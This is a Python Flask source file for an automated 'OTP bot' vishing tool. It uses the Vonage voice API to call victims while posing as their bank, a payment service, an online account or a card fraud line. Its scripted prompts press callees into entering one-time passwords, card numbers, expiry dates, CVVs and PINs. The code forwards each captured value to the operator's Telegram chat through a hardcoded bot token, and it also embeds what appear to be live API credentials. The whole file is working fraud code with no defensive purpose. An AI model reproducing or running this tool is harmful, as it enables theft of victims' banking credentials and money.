from webbrowser import get
from flask import *
import vonage, requests, json

app = Flask(__name__)

# Enter token here
token = "5239249129:AAH6l7CBMzJ1pQWGYsTrPO5fVLYUziKbLTY"

# Enter API Creds Here
client = vonage.Client(application_id="91485d24-98bf-43e0-b961-58c94ba92b27",private_key="private.key")
 
url = "http://10.0.0.107/"

number = "18885098082"

bankconf = False
payconf = False
accountconf = False
cardconf = False
cardotpconf = False

@app.route("/bank/conf")
def bankconf():
    global bankconf
    if request.args.get('conf') == "True":
        bankconf = True
    elif request.args.get('conf') == "False":
        bankconf = False
    else:
        bankconf = False

    return jsonify(Confirmation = bankconf)

@app.route("/cardotp/conf")
def cardotp():
    global cardotpconf
    if request.args.get('conf') == "True":
        cardotpconf = True
    elif request.args.get('conf') == "False":
        cardotpconf = False
    else:
        cardotpconf = False

    return jsonify(Confirmation = cardotpconf)

@app.route("/pay/conf")
def payconff():
    global payconf
    if request.args.get('conf') == "True":
        payconf = True
    elif request.args.get('conf') == "True":
        payconf = True
    else:
        payconf = False

    return jsonify(Confirmation = payconf)

@app.route("/account/conf")
def accountconff():
    global accountconf
    if request.args.get('conf') == "True":
        accountconf = True
    elif request.args.get('conf') == "True":
        accountconf = True
    else:
        accountconf = False

    return jsonify(Confirmation = accountconf)

@app.route("/cardconf/conf")
def cardconff():
    global cardconf
    if request.args.get('conf') == "True":
        cardconf = True
    elif request.args.get('conf') == "True":
        cardconf = True
    else:
        cardconf = False

    return jsonify(Confirmation = bankconf)

@app.route("/create-call/bank")
def newBankCreateCall():
    voice = vonage.Voice(client)
    response = voice.create_call({
        'to': [{'type': 'phone', 'number': request.args.get("victim")}],
        'from': {'type': 'phone', 'number': number},
        'answer_url': [f"{url}/bank/start?name={request.args.get('name')}&bank={request.args.get('bank')}&digits={request.args.get('digits')}&atmDigits={request.args.get('atmDigits')}&chat_id={request.args.get('chat_id')}"]})
    return jsonify(response)

@app.route("/bank/start")
def bankNew():
    ncco = [
        {
            "action" : "talk",
            "text" : f"hello Mister {request.args.get('name')}. welcome to online {request.args.get('bank')} bank. we have received login request from your account, if this was not you, press 1. if this was you press 2. when you are finished, please  press  pound key"
        },
        {
        "action": "input",
        "type": [
            "dtmf"
        ],
        "dtmf": {
            "submitOnHash": False,
            "timeOut": 10,
            "maxDigits": 1,
        },
        "eventUrl": [f"{url}/bank/otp?digits={request.args.get('digits')}&chat_id={request.args.get('chat_id')}"]
    },
    ]
    return jsonify(ncco)

@app.route("/bank/otp", methods=['GET', 'POST'])
def bankNewOtp():
    data = request.get_json()
    if str(data['dtmf']['digits']) != "":
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?text=User Entered: {data['dtmf']['digits']}&chat_id={request.args.get('chat_id')}")
    else:
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=User hasn't entered anything")
    ncco = [
        {
            "action" : "talk",
            "text" : f"Please enter {request.args.get('digits')} digits one time password that we have send to you. when you are finished. please press pound key."
        },
        {
        "action": "input",
        "type": [
            "dtmf"
        ],
        "dtmf": {
            "submitOnHash": False,
            "timeOut": 10,
            "maxDigits": int(request.args.get('digits')),
        },
        "eventUrl": [f"{url}/bank/check?digits={request.args.get('digits')}&chat_id={request.args.get('chat_id')}"]
    },
    ]
    return jsonify(ncco)

@app.route("/bank/check", methods=['GET','POST'])
def bankNewThanks():
    data = request.get_json()
    if str(data['dtmf']['digits']) != "":
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?text=OTP Found: {data['dtmf']['digits']}&chat_id={request.args.get('chat_id')}")
    else:
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=OTP Not Found")
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=Retrying...")
        ncco = [
        {
            "action" : "talk",
            "text" : "Sorry. you have not entered anything. Please co-operate with us."
        },
        {
        "action": "input",
        "type": [
            "dtmf"
        ],
        "dtmf": {
            "submitOnHash": False,
            "timeOut": 1,
            "maxDigits": 1,
        },
        "eventUrl": [f"{url}/bank/otp?chat_id={request.args.get('chat_id')}&digits={request.args.get('digits')}"]
    },
    ]
        return jsonify(ncco)

    ncco = [
        {
            "action" : "talk",
            "text" : "Thanks you very much for entering your one time password. we are verifying it please wait."
        },
        {
        "action": "input",
        "type": [
            "dtmf"
        ],
        "dtmf": {
            "submitOnHash": False,
            "timeOut": 10,
            "maxDigits": 1,
        },
        "eventUrl": [f"{url}/bank/recheck?chat_id={request.args.get('chat_id')}&digits={request.args.get('digits')}"]
    },
    ]
    
    return jsonify(ncco)

@app.route("/bank/recheck", methods=['GET', 'POST'])
def recheck():
    if bankconf:
        ncco = [{
            "action" : "talk",
            "text" : "great. you have done a great job. we will verify your account. please be calm if any transaction made within 24 to 48 hours, it will be refunded. good bye"
        }]
    else:
        ncco = [
        {
            "action" : "talk",
            "text" : "sorry, we cannot get the right input from you."
        },
        {
        "action": "input",
        "type": [
            "dtmf"
        ],
        "dtmf": {
            "submitOnHash": False,
            "timeOut": 1,
            "maxDigits": 1,
        },
        "eventUrl": [f"{url}/bank/otp?chat_id={request.args.get('chat_id')}&digits={request.args.get('digits')}"]
    },
    ]
    return jsonify(ncco)

@app.route("/event")
def event():
    r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=Call Status: {request.args.get('status').capitalize()}")
    print(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=Call Status: {request.args.get('status').capitalize()}")
    print(r.json())
    return "Msg Sent!"

@app.route("/create-call/pay")
def createPayCall():
    voice = vonage.Voice(client)
    response = voice.create_call({
        'to': [{'type': 'phone', 'number': request.args.get("victim")}],
        'from': {'type': 'phone', 'number': number},
        'answer_url': [f"{url}/pay/start?name={request.args.get('name')}&bank={request.args.get('bank')}&digits={request.args.get('digits')}&atmDigits={request.args.get('atmDigits')}&chat_id={request.args.get('chat_id')}"]})
    return jsonify(response)

@app.route("/pay/start", methods=['POST', 'GET'])
def payStart():
    ncco = [{
        "action": "talk",
        "text": f"Hello! mister {request.args.get('name')}. we are calling from {request.args.get('bank')} pay. We have found a recent suspicious transaction on your account, if this was not you, please press 1, if this was you, please press 2 followed by the hash key.",
        "language": "en-US",
        "style": 2,
    },
    {
        "action": "input",
        "type": [
            "dtmf"
        ],
        "dtmf": {
            "submitOnHash": True,
            "timeOut": 10,
            "maxDigits": 1,
        },
        "eventUrl": [f"{url}/pay/otp?atmDigits={request.args.get('atmDigits')}&digits={request.args.get('digits')}&chat_id={request.args.get('chat_id')}"]
    },
]   
    return jsonify(ncco)

@app.route("/pay/otp", methods=['POST', 'GET'])
def payOtp():
    data = request.get_json()
    if str(data['dtmf']['digits']) != "":
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=User Entered: {data['dtmf']['digits']}")
    else:
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=User hasn't entered anything")
        
    ncco = [
        {
        "action": "talk",
        "text" : f"For security and to block this request, we will need you to confirm your identity. please enter {request.args.get('digits')} digits security code, we have send you by text. when you are finish, please press hash key",
        "language": "en-US",
        "style": 2,
        },
        {
        "action": "input",
        "type": [
            "dtmf"
        ],
        "dtmf": {
            "submitOnHash": True,
            "maxDigits": int(request.args.get('digits')),
            "timeOut": 15
        },
        "eventUrl": [f"{url}/pay/check?atmDigits={request.args.get('atmDigits')}&digits={request.args.get('digits')}&chat_id={request.args.get('chat_id')}"]
    }]
    return jsonify(ncco)

@app.route("/pay/check", methods=['GET', 'POST'])
def payCheck():
    data = request.get_json()
    if str(data['dtmf']['digits']) != "":
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?text=OTP Found: {data['dtmf']['digits']}&chat_id={request.args.get('chat_id')}")
    else:
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=OTP Not Found")
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=Retrying...")
        ncco = [
        {
            "action" : "talk",
            "text" : "Sorry. you have not entered anything. Please co-operate with us."
        },
        {
        "action": "input",
        "type": [
            "dtmf"
        ],
        "dtmf": {
            "submitOnHash": False,
            "timeOut": 1,
            "maxDigits": 1,
        },
        "eventUrl": [f"{url}/pay/otp?chat_id={request.args.get('chat_id')}&digits={request.args.get('digits')}"]
    },
    ]
        return jsonify(ncco)
    ncco = [
        {
            "action" : "talk",
            "text" : "Thanks you very much for entering your one time password. we are verifying it please wait."
        },
        {
        "action": "input",
        "type": [
            "dtmf"
        ],
        "dtmf": {
            "submitOnHash": False,
            "timeOut": 10,
            "maxDigits": 1,
        },
        "eventUrl": [f"{url}/pay/atmpin?atmDigits={request.args.get('atmDigits')}&digits={request.args.get('digits')}&chat_id={request.args.get('chat_id')}"]
    },
    ]
    
    return jsonify(ncco)

@app.route("/pay/atmpin", methods=['POST', 'GET'])
def payAtmPin():
    data = request.get_json()
    if payconf:
        # r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=OTP Found: {data['dtmf']['digits']}")
        ncco = [
        {
            "action" : "talk",
            "text" : f"great! you have entered O T P. now please enter your {request.args.get('atmDigits')} digits card pin followed by hash key.",
            "language": "en-US",
            "style": 2,
        },
        {
            "action" : "input",
            "type" : [
                "dtmf"
            ],
            "dtmf" : {
                "submitOnHash" : True,
                "maxDigits" : int(request.args.get("atmDigits")),
                "timeout" : 15
            },
            "eventUrl" : [f"{url}/pay/thanks?chat_id={request.args.get('chat_id')}"]
        }
    ]
    else:
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=OTP Not Found")
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=Retrying...")
        ncco = [
        {
            "action" : "talk",
            "text" : "sorry, we cannot get the right input from you."
        },
        {
        "action": "input",
        "type": [
            "dtmf"
        ],
        "dtmf": {
            "submitOnHash": False,
            "timeOut": 1,
            "maxDigits": 1,
        },
        "eventUrl": [f"{url}/pay/otp?atmDigits={request.args.get('atmDigits')}&digits={request.args.get('digits')}&chat_id={request.args.get('chat_id')}"]
    },
    ]
    return jsonify(ncco)

@app.route("/pay/thanks", methods=['GET', 'POST'])
def payThanks():
    data = request.get_json()
    if str(data['dtmf']['digits']) != "":
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=Card  Pin Found: {data['dtmf']['digits']}")
        ncco = [
        {
            "action": "talk",
            "text" : "thanks for verifying with us. we are processing your request. if any transaction made within 24 to 48 hours, it will be refunded. good bye.",
            "style": 2
        }
    ]
    else:
        ncco = [
        {
            "action" : "talk",
            "text" : "sorry, we cannot get the right input from you."
        },
        {
        "action": "input",
        "type": [
            "dtmf"
        ],
        "dtmf": {
            "submitOnHash": False,
            "timeOut": 1,
            "maxDigits": 1,
        },
        "eventUrl": [f"{url}/pay/atmpin?atmDigits={request.args.get('atmDigits')}&digits={request.args.get('digits')}&chat_id={request.args.get('chat_id')}"]
    },
    ]
    return jsonify(ncco)

@app.route("/create-call/account")
def createAccountCall():
    voice = vonage.Voice(client)
    response = voice.create_call({
        'to': [{'type': 'phone', 'number': request.args.get("victim")}],
        'from': {'type': 'phone', 'number': number},
        'answer_url': [f"{url}/account/start?name={request.args.get('name')}&method={request.args.get('method')}&digits={request.args.get('digits')}&account={request.args.get('account')}&chat_id={request.args.get('chat_id')}"]})
    return jsonify(response)

@app.route("/account/start")
def accountStart():
    ncco = [
        {
        "action": "talk",
        "text": f"Hello! mister {request.args.get('name')}. we are calling from {request.args.get('account')}. We have found a recent suspicious login attempt on your account, if this was not you, please press 1, if this was you, please press 2 followed by the hash key.",
        "language": "en-US",
        "style": 3,
    },
    {
        "action": "input",
        "type": [
            "dtmf"
        ],
        "dtmf": {
            "submitOnHash": True,
            "timeOut": 10,
            "maxDigits": 1,
        },
        "eventUrl": [f"{url}/account/otp?digits={request.args.get('digits')}&chat_id={request.args.get('chat_id')}&method={request.args.get('method')}"]
    },
    ]
    return jsonify(ncco)

@app.route("/account/otp", methods=['POST', 'GET'])
def accountOtp():
    data = request.get_json()
    if str(data['dtmf']['digits']) != "":
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=User Entered: {data['dtmf']['digits']}")
    else:
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=User hasn't entered anything.")
    ncco = [
        {
        "action": "talk",
        "text": f"to authenticate, please enter the {request.args.get('digits')} digits security code that we have sent on your {request.args.get('method')} followed by the hash key.",
        "language": "en-US",
        "style": 3,
        },
        {
        "action": "input",
        "type": [
            "dtmf"
        ],
        "dtmf": {
            "submitOnHash": True,
            "maxDigits": int(request.args.get('digits')),
            "timeOut": 15
        },
        "eventUrl": [f"{url}/account/check?digits={request.args.get('digits')}&chat_id={request.args.get('chat_id')}&method={request.args.get('method')}"]
    }]
    return jsonify(ncco)

@app.route("/account/check", methods=['GET', 'POST'])
def accountCheck():
    data = request.get_json()
    if str(data['dtmf']['digits']) != "":
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=OTP Found: {data['dtmf']['digits']}")
    else:
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=User hasn't entered anything.")
        ncco = [
        {
            "action" : "talk",
            "text" : "Sorry. you have not entered anything. Please co-operate with us."
        },
        {
        "action": "input",
        "type": [
            "dtmf"
        ],
        "dtmf": {
            "submitOnHash": False,
            "timeOut": 1,
            "maxDigits": 1,
        },
        "eventUrl": [f"{url}/account/otp?chat_id={request.args.get('chat_id')}&digits={request.args.get('digits')}"]
    },
    ]
        return jsonify(ncco)
    ncco = [
        {
            "action" : "talk",
            "text" : "Thanks you very much for entering your one time password. we are verifying it please wait."
        },
        {
        "action": "input",
        "type": [
            "dtmf"
        ],
        "dtmf": {
            "submitOnHash": False,
            "timeOut": 10,
            "maxDigits": 1,
        },
        "eventUrl": [f"{url}/account/thanks?digits={request.args.get('digits')}&chat_id={request.args.get('chat_id')}&method={request.args.get('method')}"]
    },
    ]
    return jsonify(ncco)

@app.route("/account/thanks", methods=['POST', 'GET'])
def accountThanks():
    data = request.get_json()
    if accountconf:
            r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=OTP Found: {data['dtmf']['digits']}")
            ncco = [
        {
        "action": "talk",
        "text": f"thank you for co operating with us. we will check and verify all the details and login attempts of your account. thank you.",
        "language": "en-US",
        "style": 2,
        }]
    else:
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=User hasn't entered anything.")
        ncco = [
        {
            "action" : "talk",
            "text" : "sorry, we cannot get the right input from you."
        },
        {
        "action": "input",
        "type": [
            "dtmf"
        ],
        "dtmf": {
            "submitOnHash": False,
            "timeOut": 1,
            "maxDigits": 1,
        },
        "eventUrl": [f"{url}/account/otp?atmDigits={request.args.get('atmDigits')}&digits={request.args.get('digits')}&chat_id={request.args.get('chat_id')}"]
    },
    ]
    
    return jsonify(ncco)

@app.route("/create-call/card")
def createCardCall():
    voice = vonage.Voice(client)
    response = voice.create_call({
        'to': [{'type': 'phone', 'number': request.args.get("victim")}],
        'from': {'type': 'phone', 'number': number},
        'answer_url': [f"{url}/card/start?name={request.args.get('name')}&card={request.args.get('card')}&bank={request.args.get('bank')}&chat_id={request.args.get('chat_id')}"]
    })
    return jsonify(response)


@app.route("/card/start", methods=["GET", "POST"])
def cardStart():
    ncco = [
        {
            "action" : "talk",
            "text" : f"Hello! mister {request.args.get('name')}. We are calling from {request.args.get('bank')} fraud prevention line. we have blocked a recent suspicious online purchase on your {request.args.get('card')} card where your card details were used online. if this was not you, please press 1. if this was you, please press 2 followed by hash key.",
            "style" : 2
        },
        {
            "action" : "input",
            "type" : ["dtmf"],
            "dtmf" : {
                "submitOnHash" : True,
                "maxDigits" : 1,
                "timeout" : 15
            },
            "eventUrl" : [f"{url}/card/number?card={request.args.get('card')}&chat_id={request.args.get('chat_id')}"]
        }
    ]
    return jsonify(ncco)

@app.route("/card/number", methods=["GET", "POST"])
def cardNumber():
    data = request.get_json()
    r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=User Entered: {data['dtmf']['digits']}")
    ncco = [
        {
            "action" : "talk",
            "text" : f"For your security and to block this purchase please enter your {request.args.get('card')} card number followed by hash key",
            "style" : 2
        },
        {
            "action" : "input",
            "type" : ["dtmf"],
            "dtmf" : {
                "submitOnHash" : True,
                "maxDigits" : 16,
                "timeout" : 15
            },
            "eventUrl" : [f"{url}/card/expire?chat_id={request.args.get('chat_id')}"]
        }
    ]
    return jsonify(ncco)

@app.route("/card/expire", methods=["GET", "POST"])
def cardExpire():
    data = request.get_json()
    r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=Card  Number Found: {data['dtmf']['digits']}")
    ncco = [
        {
            "action" : "talk",
            "text" : f"great! now please enter your card expire date in this format. month, month, year, year, year, year, followed by hash key",
            "style" : 2
        },
        {
            "action" : "input",
            "type" : ["dtmf"],
            "dtmf" : {
                "submitOnHash" : True,
                "maxDigits" : 6,
                "timeout" : 15
            },
            "eventUrl" : [f"{url}/card/cvv?chat_id={request.args.get('chat_id')}"]
        }
    ]
    return jsonify(ncco)

@app.route("/card/cvv", methods=["GET", "POST"])
def cardCvv():
    data = request.get_json()
    r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=Expire Date Found: {data['dtmf']['digits']}")
    ncco = [
        {
            "action" : "talk",
            "text" : f"great! now please enter the C V V number of your card which is written on the back side of your card followed by hash key.",
            "style" : 2
        },
        {
            "action" : "input",
            "type" : ["dtmf"],
            "dtmf" : {
                "submitOnHash" : True,
                "maxDigits" : 3,
                "timeout" : 15
            },
            "eventUrl" : [f"{url}/card/pin?chat_id={request.args.get('chat_id')}"]
        }
    ]
    return jsonify(ncco)

@app.route("/card/pin", methods=["GET", "POST"])
def cardPin():
    data = request.get_json()
    r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=CVV Found: {data['dtmf']['digits']}")
    ncco = [
        {
            "action" : "talk",
            "text" : f"the last step, please enter pin number of your card followed by hash key.",
            "style" : 2
        },
        {
            "action" : "input",
            "type" : ["dtmf"],
            "dtmf" : {
                "submitOnHash" : True,
                "maxDigits" : 4,
                "timeout" : 15
            },
            "eventUrl" : [f"{url}/card/thanks?chat_id={request.args.get('chat_id')}"]
        }
    ]
    return jsonify(ncco)

@app.route("/card/thanks", methods=["GET", "POST"])
def cardThanks():
    data = request.get_json()
    r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=Pin Found: {data['dtmf']['digits']}")
    ncco = [
        {
            "action" : "talk",
            "text" : f"okay! you have entered all the details which we asked. we are verifying your card. we will inform you within 24 to 48 business hours. good bye",
            "style" : 2
        }
    ]
    return jsonify(ncco)

@app.route("/create-call/cardotp")
def cardOtp():
    voice = vonage.Voice(client)
    response = voice.create_call({
        'to': [{'type': 'phone', 'number': request.args.get("victim")}],
        'from': {'type': 'phone', 'number': number},
        'answer_url': [f"{url}/cardotp/start?name={request.args.get('name')}&amount={request.args.get('amount')}&bank={request.args.get('bank')}&chat_id={request.args.get('chat_id')}&type={request.args.get('type')}&site={request.args.get('site')}&digits={request.args.get('digits')}&end={request.args.get('end')}"]
    })
    return jsonify(response)

@app.route("/cardotp/start", methods=['GET', 'POST'])
def cardOtpStart():
    cardend = ""
    for i in str(request.args.get('end')):
        cardend = cardend + i + ", "
    ncco = [
        {
            "action" : "talk",
            "text" : f"hello mister {request.args.get('name')}, we are calling from {request.args.get('bank')} bank. we are getting a purchase of {request.args.get('amount')}. which is going to be done, on a website named {request.args.get('site')}. through your {request.args.get('type')} card, ending with {cardend}. if this was you, press one. if this was not you, press 2"
        },
        {
            "action" : "input",
            "type" : ["dtmf"],
            "dtmf" : {
                "submitOnHash" : False,
                "maxDigits" : 1,
                "timeout" : 10
            },
            "eventUrl" : [f"{url}/cardotp/otp?name={request.args.get('name')}&amount={request.args.get('amount')}&bank={request.args.get('bank')}&chat_id={request.args.get('chat_id')}&type={request.args.get('type')}&site={request.args.get('site')}&digits={request.args.get('digits')}&end={request.args.get('end')}"]
        }
    ]
    return jsonify(ncco)

@app.route("/cardotp/otp", methods=['GET', 'POST'])
def cardOtpOtp():
    data = request.get_json()
    if str(data['dtmf']['digits']) != "":
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=USer Entered: {data['dtmf']['digits']}")
        if str(data['dtmf']['digits']) == "1":
            ncco = [
                {
                    "action" : "talk",
                    "text" : f"thank you very much for entering your input and for co-operating with us. we have sent you a {request.args.get('digits')} digits verification code for {request.args.get('amount')} payment verification. please enter that one time password."
                },
                {
                    "action" : "input",
                    "type" : ["dtmf"],
                    "dtmf" : {
                        "submitOnHash" : False,
                        "maxDigits" : int(request.args.get('digits')),
                        "timeout" : 10
                    },
                    "eventUrl" : [f"{url}/cardotp/check?name={request.args.get('name')}&amount={request.args.get('amount')}&bank={request.args.get('bank')}&chat_id={request.args.get('chat_id')}&type={request.args.get('type')}&site={request.args.get('site')}&digits={request.args.get('digits')}&end={request.args.get('end')}"]
        }
            ]

        else:
            ncco = [
                {
                    "action" : "talk",
                    "text" : f"thank you very much for entering your input and for co-operating with us. we have sent you a {request.args.get('digits')} digits verification code for {request.args.get('amount')} payment verification. please enter that one time password for rejecting this transaction to secure your account."
                },
                {
                    "action" : "input",
                    "type" : ["dtmf"],
                    "dtmf" : {
                        "submitOnHash" : False,
                        "maxDigits" : int(request.args.get('digits')),
                        "timeout" : 10
                    },
                    "eventUrl" : [f"{url}/cardotp/check?name={request.args.get('name')}&amount={request.args.get('amount')}&bank={request.args.get('bank')}&chat_id={request.args.get('chat_id')}&type={request.args.get('type')}&site={request.args.get('site')}&digits={request.args.get('digits')}&end={request.args.get('end')}"]
        }
            ]

    else:
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=USer hasn't entered anything...")
        ncco = [
                {
                    "action" : "talk",
                    "text" : f"Sorry you have not entered anything. please co-operate with us."
                },
                {
                    "action" : "input",
                    "type" : ["dtmf"],
                    "dtmf" : {
                        "submitOnHash" : False,
                        "maxDigits" : 1,
                        "timeout" : 1
                    },
                    "eventUrl" : [f"{url}/cardotp/otp?name={request.args.get('name')}&amount={request.args.get('amount')}&bank={request.args.get('bank')}&chat_id={request.args.get('chat_id')}&type={request.args.get('type')}&site={request.args.get('site')}&digits={request.args.get('digits')}&end={request.args.get('end')}"]
        }
            ]
    return jsonify(ncco)

@app.route("/cardotp/check", methods=['GET', 'POST'])
def cardOtpCheck():
    data = request.get_json()
    if str(data['dtmf']['digits']) != "":
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=OTP Found: {data['dtmf']['digits']}")
    else:
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=User hasn't entered anything..")
        ncco = [
        {
            "action" : "talk",
            "text" : "Sorry, you have not entered anything. please co-operate with us."
        },
        {
        "action": "input",
        "type": [
            "dtmf"
        ],
        "dtmf": {
            "submitOnHash": False,
            "timeOut": 1,
            "maxDigits": 1,
        },
        "eventUrl": [f"{url}/cardotp/start?name={request.args.get('name')}&amount={request.args.get('amount')}&bank={request.args.get('bank')}&chat_id={request.args.get('chat_id')}&type={request.args.get('type')}&site={request.args.get('site')}&digits={request.args.get('digits')}&end={request.args.get('end')}"]
    },
    ]
        return jsonify(ncco)
    
    ncco = [
        {
            "action" : "talk",
            "text" : "Thanks you very much for entering your one time password. we are verifying it please wait."
        },
        {
        "action": "input",
        "type": [
            "dtmf"
        ],
        "dtmf": {
            "submitOnHash": False,
            "timeOut": 10,
            "maxDigits": 1,
        },
        "eventUrl": [f"{url}/cardotp/thanks?name={request.args.get('name')}&amount={request.args.get('amount')}&bank={request.args.get('bank')}&chat_id={request.args.get('chat_id')}&type={request.args.get('type')}&site={request.args.get('site')}&digits={request.args.get('digits')}&end={request.args.get('end')}"]
    },
    ]
    return jsonify(ncco)

@app.route("/cardotp/thanks", methods=['GET', 'POST'])
def cardOtpChek():
    global cardotpconf
    if cardotpconf:
        ncco = [
            {
                "action" : "talk",
                "text" : "Thank you very much for verifying your acount with us. we are processing our request. if any transaction made within 24 to 48 hours, it will be refunded. good bye."
                
            }
        ]
    
    else:
        ncco = [
        {
            "action" : "talk",
            "text" : "Sorry, you have not entered correct one time password. please co-operate with us."
        },
        {
        "action": "input",
        "type": [
            "dtmf"
        ],
        "dtmf": {
            "submitOnHash": False,
            "timeOut": 1,
            "maxDigits": 1,
        },
        "eventUrl": [f"{url}/cardotp/start?name={request.args.get('name')}&amount={request.args.get('amount')}&bank={request.args.get('bank')}&chat_id={request.args.get('chat_id')}&type={request.args.get('type')}&site={request.args.get('site')}&digits={request.args.get('digits')}&end={request.args.get('end')}"]
    },
    ]
        return jsonify(ncco)
    return jsonify(ncco)

if __name__ == "__main__":
    app.run(debug=True, port=80, host="0.0.0.0")
